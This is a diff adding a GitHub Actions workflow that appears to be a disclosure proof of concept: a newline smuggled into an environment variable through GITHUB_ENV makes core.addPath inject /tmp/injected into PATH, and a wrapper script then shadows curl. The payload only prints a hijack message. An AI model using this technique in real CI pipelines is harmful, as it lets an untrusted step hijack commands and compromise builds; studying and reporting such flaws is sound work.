@@ -1,0 +1,62 @@
+name: addPath Cross-Step Injection Chain PoC
+on:
+  workflow_dispatch:
+
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Step 1 - Untrusted action sets env var with embedded newline
+        run: |
+          # Simulating what a malicious/compromised composite action could do
+          # GITHUB_ENV with delimiter format PRESERVES newlines in values
+          delimiter="ghadelimiter_$(uuidgen)"
+          echo "XDG_BIN_HOME<<${delimiter}" >> $GITHUB_ENV
+          printf '/opt/safe/bin\n/tmp/injected' >> $GITHUB_ENV
+          echo "" >> $GITHUB_ENV
+          echo "${delimiter}" >> $GITHUB_ENV
+          
+          echo "Set XDG_BIN_HOME with embedded newline via GITHUB_ENV delimiter format"
+      
+      - name: Step 2 - Legitimate action reads env var and calls addPath
+        uses: actions/github-script@v7
+        with:
+          script: |
+            // This simulates what setup-uv does at line 197:
+            // core.addPath(process.env.XDG_BIN_HOME)
+            const xdgBinHome = process.env.XDG_BIN_HOME;
+            core.info(`XDG_BIN_HOME value: ${JSON.stringify(xdgBinHome)}`);
+            core.info(`Contains newline: ${xdgBinHome.includes('\n')}`);
+            core.addPath(xdgBinHome);
+      
+      - name: Step 3 - Verify PATH injection
+        run: |
+          echo "=== PATH entries ==="
+          echo "$PATH" | tr ':' '\n' | head -15
+          echo ""
+          if echo "$PATH" | tr ':' '\n' | grep -q "/tmp/injected"; then
+            echo "CROSS-STEP INJECTION: /tmp/injected was injected into PATH!"
+            echo ""
+            echo "Attack chain:"
+            echo "  1. Step 1 (untrusted) sets XDG_BIN_HOME='/opt/safe/bin\\n/tmp/injected' via GITHUB_ENV"
+            echo "  2. Step 2 (trusted, like setup-uv) reads env var and calls core.addPath()"
+            echo "  3. core.addPath() lacks newline protection -> both paths injected"
+            echo "  4. Subsequent steps execute from /tmp/injected"
+          else
+            echo "NOT INJECTED - newline handling changed"
+          fi
+          
+          # Demonstrate trojan execution
+          mkdir -p /tmp/injected
+          cat > /tmp/injected/curl << 'TROJAN'
+          #!/bin/bash
+          echo "[HIJACKED] curl replaced by /tmp/injected/curl"
+          echo "Original curl: /usr/bin/curl"
+          /usr/bin/curl "$@"
+          TROJAN
+          chmod +x /tmp/injected/curl
+          
+          echo ""
+          echo "=== Step 3: curl command resolves to ==="
+          which curl
+          curl --version 2>&1 | head -1
